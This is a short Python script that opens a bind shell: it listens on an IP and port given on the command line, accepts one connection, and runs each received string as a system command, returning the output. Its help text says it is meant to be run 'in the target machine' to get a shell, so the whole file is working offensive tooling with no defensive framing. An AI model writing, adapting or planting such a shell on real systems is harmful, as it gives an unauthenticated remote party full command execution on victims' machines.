from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
from time import sleep
from argparse import ArgumentParser
import sys
import signal

def ctrl_c(signal,frame):
    sys.exit(0)
signal.signal(signal.SIGINT,ctrl_c)

def init_connection(target:str)->None:
    ip, port = target.split(":")
    port = int(port)
    try:
        server_address = (ip,port)
        server_socket = socket()
        server_socket.bind(server_address)
        server_socket.listen(1)
        client_socket, client_address = server_socket.accept()
    except Exception as e:
        print(f"Connection failure due to : {e}")
        sys.exit(1)
    return server_socket, client_socket

def loop(server:socket,client:socket):
    state = 'running'
    try:
        while state == 'running':
            command = client.recv(4096).decode()
            if command == 'exit':
                client.close()
                server.close()
                state = 'stopped' 
            elif command.split(" ")[0] == 'cd':
                chdir(" ".join(command.split(" ")[1:]))
                client.send("Current Work Directory: {}".format(getcwd()).encode())
            else:
                output = getoutput(command)
                client.send(output.encode())
            sleep(0.1)
    except KeyboardInterrupt:
        print(f"\nExit by the user")
        state = 'stopped' 
        client.close()
        server.close()
    
def get_target()->str:
    argsParser = ArgumentParser(description="This script should be executed in the target machine to get a powershell") 
    argsParser.add_argument("--target",type=str,help="The IP target and the port like: 192.168.1.1:8080")
    args = argsParser.parse_args()
    return args.target

if __name__ == '__main__':
    target = get_target()
    server, client = init_connection(target)
    loop(server,client)